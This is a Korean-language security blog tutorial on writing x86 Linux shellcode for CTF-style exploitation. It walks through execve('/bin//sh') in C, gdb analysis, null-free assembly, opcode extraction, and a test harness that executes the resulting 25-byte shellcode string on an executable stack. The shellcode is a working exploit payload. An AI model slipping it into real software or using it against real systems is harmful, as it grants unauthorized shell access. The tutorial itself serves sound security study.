---
title: "Writing Shellcode on Linux x86"
description: "Archive of security studies(2018–2022)"
date: 2019-06-02T11:44:12+09:00
# weight: 1
# aliases: ["/first"]
tags: ["security"]
author: "Byeongmin Bae"
# author: ["Me", "You"] # multiple authors
draft: false
---

이번 글에서는 pwner 의 기본기인 쉘코드 작성법에 대해 간단히 알아보겠습니다.

대회에 출제된 문제중에 이미 알려진 쉘코드를 사용해도 익스가 안될 때가 있어서 이럴땐 커스텀 쉘코드를 만드는 것이 좋습니다.

솔직히 요즘엔 다들 pwntools 의 shellcraft 를 써서 간단히 만들지만, 이번 포스팅에서는 How? 에 중점을 둬서 선조님들의 방식으로 한번 만들어보겠습니다.

쉘코드를 만들려면 먼저 c로 쉘을 실행하는 코드를 작성하고 타깃 아키텍처에 맞게 빌드해야 합니다. 그런 다음 바이너리를 분석해 어셈 코드로 재작성하고, 최종적으로 opcode를 추출하면 쉘코드가 완성됩니다.

최적화 한다면 더 짧은 쉘코드도 만들 수 있지만 본 포스팅에선 다루지 않겠습니다.

```c
#include <stdio.h>
#include <stdlib.h>
/*
    $ gcc -m32 -g --static ./sc.c -o ./sc
    $ ./sc
    $ id
    uid=1000(daniel) gid=1000(daniel) groups=1000(daniel)
*/
int main(int argc, char **argv)
{
    char *v0[2];
    *(v0) = "/bin//sh"; // 4바이트 정렬
    *(v0 + 1) = (char *)0x00;
    execve(*v0, v0, *(v0 + 1)); // execve("/bin//sh", ["/bin//sh"], NULL)
    return 0;
}
```

쉘을 여는 간단한 코드입니다. `system()` 를 사용하지 않은 이유는 어차피 `system()` 내부에서 `execve()` 를 사용하기 때문에 그렇습니다. 굳이 분석 난이도를 늘릴 필요가 없습니다.

빌드를 끝냈다면 gdb 에 붙여서 실행해줍시다.

`execve()` 에 BP 를 건뒤 코드와 스택을 보면 쉘코드를 어떻게 구성해야할지 대략 감이 옵니다.

x86 시스템콜 테이블상 `0xb` 는 execve 를 의미합니다

```shell
(gdb) x/10i $pc
=> 0x806c501 <execve+1>:        mov    0x10(%esp),%edx
   0x806c505 <execve+5>:        mov    0xc(%esp),%ecx
   0x806c509 <execve+9>:        mov    0x8(%esp),%ebx
   0x806c50d <execve+13>:       mov    $0xb,%eax
   0x806c512 <execve+18>:       call   *%gs:0x10
   0x806c519 <execve+25>:       pop    %ebx
   0x806c51a <execve+26>:       cmp    $0xfffff001,%eax
   0x806c51f <execve+31>:       jae    0x8071250 <__syscall_error>
   0x806c525 <execve+37>:       ret
   0x806c526:   xchg   %ax,%ax
(gdb) x/x $sp+0x10
0xffffcc18:     0x00000000
(gdb) x/x $sp+0xc
0xffffcc14:     0xffffcc34
(gdb) x/x *(0xffffcc14)
0xffffcc34:     0x080ae008
(gdb) x/x **(0xffffcc14)
0x80ae008:      0x6e69622f
(gdb) x/x $sp+0x8
0xffffcc10:     0x080ae008
```

쉘을 열려면 이렇게 레지스터를 맞춰주고 시스템 콜을 호출하면 됩니다.

*   eax: `0xb`
    
*   ebx: `"/bin//sh"`
    
*   ecx: `["/bin//sh"]`
    
*   edx: `null`
    

이에 맞춰서 어셈 코드를 작성하고 빌드해야 하는데, `mov $0xb,%eax` 에서 eax 는 32비트 레지스터이기 때문에 `0xb` 가 opcode 상으로 `0x0000000b` 가 됩니다.

쉘코드에 null 이 포함되면 `strcpy()` 같은 문자열 기반 함수에서 문제가 생기니 null 은 없애주는 것이 좋습니다.

al 레지스터는 eax 의 하위 1바이트라서 null 이 생기지 않으니 이 부분은 al 로 변경하도록 하겠습니다.

```shell
$ cat ./sa.S
start:
        xor %eax, %eax
        xor %edx, %edx
        push %eax
        push $0x68732f2f # hs//
        push $0x6e69622f # nib/
        mov %esp, %ebx   # "/bin//sh"
        push %eax
        push %ebx
        mov %esp, %ecx   # ["/bin//sh"]
        mov $0xb, %al
        int $0x80

$ cat ./build.sh
#!/bin/bash
target="sa"
$(which rm) -f $PWD/$target
$(which as) --32 $PWD/$target.S -o $PWD/$target.o
$(which ld) -m elf_i386 $PWD/$target.o -o $PWD/$target
$(which rm) -f $PWD/$target.o

$ ./build.sh

$ objdump -D ./sa | grep start -A 12
08049000 <start>:
 8049000:       31 c0                   xor    %eax,%eax
 8049002:       31 d2                   xor    %edx,%edx
 8049004:       50                      push   %eax
 8049005:       68 2f 2f 73 68          push   $0x68732f2f
 804900a:       68 2f 62 69 6e          push   $0x6e69622f
 804900f:       89 e3                   mov    %esp,%ebx
 8049011:       50                      push   %eax
 8049012:       53                      push   %ebx
 8049013:       89 e1                   mov    %esp,%ecx
 8049015:       b0 0b                   mov    $0xb,%al
 8049017:       cd 80                   int    $0x80
```

objdump 로 바이너리를 까보면 opcode 가 나오는데 순서대로 나열하시면 됩니다.

쉘코드를 검증하기 위해선 dep 를 해제하고 스택에 쉘코드를 넣은뒤 실행시키면 됩니다.

```c
$ cat ./sh.c
#include <stdio.h>
/*
 * $ gcc -m32 -z execstack ./sh.c -o ./sh
 */
char *shellcode = "\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
int main()
{
    (*(void (*)())shellcode)(); // ???
    return 0;
}

$ gcc -m32 -z execstack ./sh.c -o ./sh
$ ./sh
$ id
uid=1000(daniel) gid=1000(daniel) groups=1000(daniel)
```

쉘코드 검증까지 성공했습니다. 그런데 여기서 특이한 구문이 나오는데요, `(*(void (*)())shellcode)();` 이게 뭘까요?

지금 쉘코드는 그냥 문자열 배열입니다. 이걸 실행하려면 함수의 시작 주소처럼 취급하도록 강제로 캐스팅해야 합니다.

`void (*)()`는 void형 함수 포인터 타입입니다. `*`를 괄호로 감싸는 이유는, 괄호가 없으면 `void` 포인터를 반환하는 함수의 선언으로 해석되기 때문입니다.

`(void (*)())shellcode`는 shellcode 배열의 시작 주소를 함수 포인터 타입으로 캐스팅하는 것입니다. 애초에 C 에서 함수명은 해당 함수의 시작주소를 의미하니 개념끼리 매칭이 됩니다.

앞에 붙은 `*`와 마지막 `()`는 그 함수 포인터를 실제로 호출하는 구문입니다. 즉, 이 부분은 "shellcode가 가리키는 주소를 함수로 보고 그곳에 존재하는 바이트들을 CPU 명령어로 해석하겠다" 라는 의미로 이해하시면 됩니다.

읽어주셔서 감사합니다.